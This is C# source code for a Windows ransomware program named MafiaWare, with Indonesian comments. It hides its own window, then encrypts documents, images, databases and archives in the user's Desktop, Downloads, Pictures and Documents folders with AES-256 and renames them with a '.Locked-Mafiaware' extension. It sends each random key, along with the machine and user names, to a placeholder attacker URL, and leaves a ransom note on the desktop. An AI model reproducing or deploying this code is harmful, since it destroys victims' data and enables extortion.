/*
*
* MAFIAWARE
* Algorithm from HT, with C Sources
* Encrypt with AES256
* contact email : cyberking@indonesianbacktrack.or.id
* Indonesian Backtrack Team ( http://indonesianbacktrack.or.id/forum )
*
*/

using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace mafiaware {
    public partial class Form1 : Form {
    //Web untuk Password Unlock nya
    string webPass = "https://yourweb.com/cyberking/w00t.php?g0ttrap=";
    string namaUser = Environment.UserName;
    string namaKompi = System.Environment.MachineName.ToString();
    string dirUsr = "C:\\Users\\"; //folder User
    // bisa di coba ke folder system32
    //string dirSystm = "C:\\Windows\\"; <-- folder Windows di targetkan ke system32 di ubah/tambah bagian fungsi ngencrypt nya
    
    public Form1() {
        InitializeComponent();
    }
    private void Form1_Load(object sender, EventArgs e) {
        Opacity = 0;
        this.ShowInTaskbar = false;
        ngeEnrypt(); //mulai ngencrypt nya pas loading
        ngeEnrypt2();
        ngeEnrypt3();
        ngeEnrypt4();
    }
    private void Form_Shown(object sender, EventArgs e) {
        Visible = false;
        Opacity = 100;
    }
    
    //Algo encrypt AES256
    public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes) {
        byte[] encryptedBytes = null;
        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
        using (MemoryStream ms = new MemoryStream()) {
        using (RijndaelManaged AES = new RijndaelManaged()) {
        AES.KeySize = 256;
        AES.BlockSize = 128;
        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
        AES.Key = key.GetBytes(AES.KeySize / 8);
        AES.IV = key.GetBytes(AES.BlockSize / 8);
        AES.Mode = CipherMode.CBC;
        using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write)) {
            cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
            cs.Close();
            }
        encryptedBytes = ms.ToArray();
        }
        }
    return encryptedBytes;
    }
    
    //buat randompass encrypt
    public string BuatPass(int length) {
    const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
    StringBuilder res = new StringBuilder();
    Random rnd = new Random();
    while (0 < length--){
        res.Append(valid[rnd.Next(valid.Length)]);
    }
    return res.ToString();
    }
    
    //ngirim pass hasil trap ke web
    public void ngirimPass(string password){
        string g0ttrap = namaKompi + "-" + namaUser + " " + password;
        var fullUrl = webPass + g0ttrap;
        var conent = new System.Net.WebClient().DownloadString(fullUrl);
        }
    
    //ngencrypt file
    public void ngencryptFile(string file, string password) {
        byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
        byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
        
        //ngehash pass dg sha256
        passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
        byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
        File.WriteAllBytes(file, bytesEncrypted);
        System.IO.File.Move(file, file+".Locked-Mafiaware"); //ekstensi hasil ngencrypt
        }
    
    //ngencrypt folder
    public void ngencryptFolder(string location, string password) {
            //ekstensi yang mau di encrypt
            var validExtensions = new[] {
            ".txt", ".doc", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb",  ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".zip", ".rar"
            };

        string[] files = Directory.GetFiles(location);
        string[] childDirectories = Directory.GetDirectories(location);
        for (int i = 0; i < files.Length; i++){
            string extension = Path.GetExtension(files[i]);
            if (validExtensions.Contains(extension))
            {
            ngencryptFile(files[i],password);
            }
            }
        for (int i = 0; i < childDirectories.Length; i++){
            ngencryptFolder(childDirectories[i],password);
            }
        }
    public void ngeEnrypt() {
    string password = BuatPass(15);
    string path = "\\Desktop";
    string startPath = dirUsr + namaUser + path;
    ngirimPass(password);
    ngencryptFolder(startPath,password);
    pesanReadMe();
    password = null;
    System.Windows.Forms.Application.Exit();
    }
    public void ngeEnrypt2() {
    string password = BuatPass(15);
    string path = "\\Downloads";
    string startPath = dirUsr + namaUser + path;
    ngirimPass(password);
    ngencryptFolder(startPath,password);
    password = null;
    System.Windows.Forms.Application.Exit();
    }
    public void ngeEnrypt3() {
    string password = BuatPass(15);
    string path = "\\Pictures";
    string startPath = dirUsr + namaUser + path;
    ngirimPass(password);
    ngencryptFolder(startPath,password);
    password = null;
    System.Windows.Forms.Application.Exit();
    }
    
    //ngencrypt 4 bagian document, jika ada folder music / shortcut music, itu ga bakal kena, perbedaan auth :p akalin sendiri utk lebih jelas
    public void ngeEnrypt4() {
    string password = BuatPass(15);
    string path = "\\Documents";
    string startPath = dirUsr + namaUser + path;
    ngirimPass(password);
    ngencryptFolder(startPath,password);
    password = null;
    System.Windows.Forms.Application.Exit();
    }
    //Pesanini diletakkan di folder desktop ( bisa di ubah atau di tambah lokasi nya, edit di bagian fungsi ngencrypt )
    public void pesanReadMe() {
        string path = "\\Desktop\\READ_ME.txt";
        string fullpath = dirUsr + namaUser + path;
        string[] lines = { "Cyberking was Encrypt your File with MafiaWare", "Email me and meet me", "my email cyberking@indonesianbacktrack.or.id" };
        System.IO.File.WriteAllLines(fullpath, lines);
        }
    }
}
